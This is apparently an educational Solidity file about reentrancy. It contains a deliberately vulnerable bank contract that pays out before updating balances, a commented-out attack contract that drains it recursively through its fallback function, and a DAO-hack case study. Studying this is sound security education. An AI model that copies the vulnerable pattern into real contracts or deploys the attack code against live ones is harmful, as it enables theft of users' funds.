// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

//this is simple progrm that is vulnerable to re-entrency attact
// check -> effect -> interaction


/*The checks effects interactions pattern is a secure coding pattern within Solidity on Ethereum which prevents an attacker from re-entering a contract over and over. It does this by ensuring that balances are updated correctly before sending a transaction. It does this by:

- Checking that the requirements are met before continuing execution.

-  Updating balances and making changes before interacting with an external actor

-  Finally, after the transaction is validated and the changes are made interactions are allowed with the external entity

The incorrectly coded pattern that usually creates a vulnerable smart contract is the common sense approach that first checks if a user’s balance is large enough for the transaction, then sends the funds to the user. Once the transaction goes through, without error, the amount is subtracted from the user’s balance.

*/

contract simpleReentrancy {
    
    mapping (address => uint) private balances;
    
    function deposit() public payable  {
        require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
        balances[msg.sender] += msg.value;

    }

    function withdraw(uint withdrawAmount) public returns (uint) {
           	require(withdrawAmount <= balances[msg.sender]);
    		msg.sender.call.value(withdrawAmount)("");
    
    		balances[msg.sender] -= withdrawAmount;
    		return balances[msg.sender];
    }
    
    function getBalance() public view returns (uint){
        return balances[msg.sender];
    }
}

// ----------------------------------------------- 

/* rentercy_attack.sol
interface targetinterface {
    function deposit() external payable; 
    function withdraw(uint withdrawAmount) external; 
}

contract simpleReenterencyAttack{
    targetinterface bankAddress = targetinterface(0x869BB59BdF8235a1b88fc3544600DB4B0A8Bc3eF);
    uint amount = 1 ether;

    function deposit() public payable {
        bankAddress.deposit.value(amount)();
    }

    function getTargetBalance() public view returns(uint){
        return address(bankAddress).balance;
    }

    function attack() public payable{
        bankAddress.withdraw(amount);
    }

    function retriveStoleFund() public{
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable{
        if (address(bankAddress).balance >= amount){
            bankAddress.withdraw(amount);
        }
    }
}
*/

//! CASE STUDY
/*
# The DAO attack was the most famous blockchain attack ever performed. The DAO was a venture capital fund which pooled investors Ether for funding projects much like a crowdfunding application. The project initially raised 12.7 million Ether which at the time was equal to about 150 million dollars.

# This Smart Contract contained a SplitDao function meant for removing funds into a child DAO when a user didn’t like a majority decision of how to use funds. However, a Reentrancy vulnerability within the split function was found that ultimately allowed the attacker to remove 3.6 million Ether from the contract. This was a lot of money, but the bigger issue was the decision made by the Ethereum community to roll back the transaction, and give the users their funds back. As this violates the immutability of the blockchain. This should never happen again, but due to the immaturity of the network at the time, they felt it was needed.

# This is the only time the Ethereum network violated the immutability of the blockchain and rolled back transactions on the Ethereum blockchain.  The decision created a major idealistic split in the Ethereum community resulting in a hard fork of the network. Because of this split we now Ethereum classic and Ethereum. The network hard forked into two separate chains. One that contains the loss of funds on Ethereum Classic and one chain that does not contain the rollback, which is what we know as Ethereum.

#Below we can see a snipped version of the original SplitDAO function which contained the issue:

1.    function splitDAO(
2.       uint _proposalID,
3.       address _newCurator
4.       noEther onlyTokenholders returns (bool  _success)) {
5.   
6.       //Snipped lines for Readability
7.       Transfer(msg.sender, 0, balances[msg.sender]);
8.       withdrawRewardFor(msg.sender); 
9.    
10.    totalSupply -= balances[msg.sender]; 
11.    balances[msg.sender] = 0;
12.    paidOut[msg.sender] = 0;
13.    return true;
14.}
 

# If you take a look at lines 7-11 you will see a violation of our Checks à Effects à Interactions pattern.

? On line 7-8 the contract is making withdrawal calls. However, following these withdrawals, the balances are updated on lines 10-11. If the attacker were to call back into the splitDao function when the interaction happened on line 8 then the attacker is able to drain the contract of millions of dollars. The balances are never updated until the attackers code is finished with its functionality.

*/